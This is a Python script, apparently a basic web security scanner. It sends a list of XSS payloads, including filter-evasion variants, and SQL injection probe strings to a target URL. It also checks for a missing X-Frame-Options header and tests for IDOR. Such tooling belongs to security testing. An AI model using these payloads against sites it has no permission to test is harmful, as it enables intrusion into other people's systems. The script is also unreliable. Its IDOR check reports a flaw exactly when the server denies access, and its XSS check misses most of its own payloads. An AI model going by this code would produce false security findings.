import requests
import re

# Define custom payloads for XSS testing
custom_payloads = [
    "<img src='x' onerror='alert(1)'>",
    "<script>alert('XSS')</script>",
    "-prompt(8)-",
    '-prompt(8)-',
    ";a=prompt,a()//",
    ';a=prompt,a()//',
    '-eval("window[\'pro\' + \'mpt\'](8)")-',
    "-eval(\"window['pro' + 'mpt'](8)\")-",
    "onclick=prompt(8)@x.y",
    "onclick=prompt(8)><svg/onload=prompt(8)>@x.y",
    "<image/src/onerror=prompt(8)>",
    "<img/src/onerror=prompt(8)>",
    "<image src/onerror=prompt(8)>",
    "<img src/onerror=prompt(8)>",
    "<image src=q onerror=prompt(8)>",
    "<img src=q onerror=prompt(8)>",
    "</scrip</script>t><img src=q onerror=prompt(8)>",
    "<script\x20type='text/javascript'>javascript:alert(1);</script>",
    "<script\x3Etype='text/javascript'>javascript:alert(1);</script>",
    "<script\x0Dtype='text/javascript'>javascript:alert(1);</script>",
    "<script\x09type='text/javascript'>javascript:alert(1);</script>",
    "<script\x0Ctype='text/javascript'>javascript:alert(1);</script>",
    "<script\x2Ftype='text/javascript'>javascript:alert(1);</script>",
    "<script\x0Atype='text/javascript'>javascript:alert(1);</script>",
    # Add more custom payloads as needed
]


def scan_xss(url, custom_payloads=[]):
    xss_pattern = re.compile(r"<script>.*?</script>")
    results = []

    try:
        response = requests.get(url)
        matches = re.findall(xss_pattern, response.text)
    except requests.exceptions.RequestException as e:
        results.append("Error: " + str(e))
        return results

    if len(matches) > 0:
        results.append("Potential XSS vulnerabilities found in the main response:")
        for match in matches:
            results.append(match)

    if custom_payloads:
        results.append("Searching for potential XSS vulnerabilities using custom payloads...")
        for payload in custom_payloads:
            test_url = url.replace("INJECT_HERE", payload)
            try:
                test_response = requests.get(test_url)
                test_matches = re.findall(xss_pattern, test_response.text)
            except requests.exceptions.RequestException as e:
                results.append("Error: " + str(e))
                continue

            if len(test_matches) > 0:
                results.append(f"Potential XSS vulnerability found using payload: {payload}")
                for match in test_matches:
                    results.append(match)

    if not results:
        results.append("No XSS vulnerability found")

    return results


# Payloads to test for SQL injection
payloads = ["'", "\"", "1' OR '1'='1", "1\" OR \"1\"=\"1"]

def is_vulnerable(response):
    # Check response content for signs of SQL error messages
    errors = {"quoted string not properly terminated",
              "unclosed quotation mark after the character string",
              "you have an error in your sql syntax;"}
    
    content = response.content.decode().lower()
    return any(error in content for error in errors)

def scan_url(url):
    vulnerable_urls = []
    
    for payload in payloads:
        test_url = url + payload
        response = requests.get(test_url)
        
        if is_vulnerable(response):
            vulnerable_urls.append(test_url)
    
    return vulnerable_urls

def click_jack(url):
    headers = requests.get(url).headers
    if 'X-Frame-Options' in headers:
        print(url + " -NOT VULNERABLE")
        return False
    else:
        print(url + " -VULNERABLE")
        return True


def scan_idor(url, user_input):
    # Construct the URL with the user input
    target_url = f"{url}/{user_input}"
    
    # Make a request to the constructed URL
    response = requests.get(target_url)
    
    # Check if the response indicates unauthorized access (e.g., HTTP status code 403 or 401)
    if response.status_code in [403, 401]:
        return f"IDOR Vulnerability Detected: {target_url}"
    
    # If no vulnerability is detected, return a message
    return f"No IDOR Vulnerabilities Detected for: {target_url}"
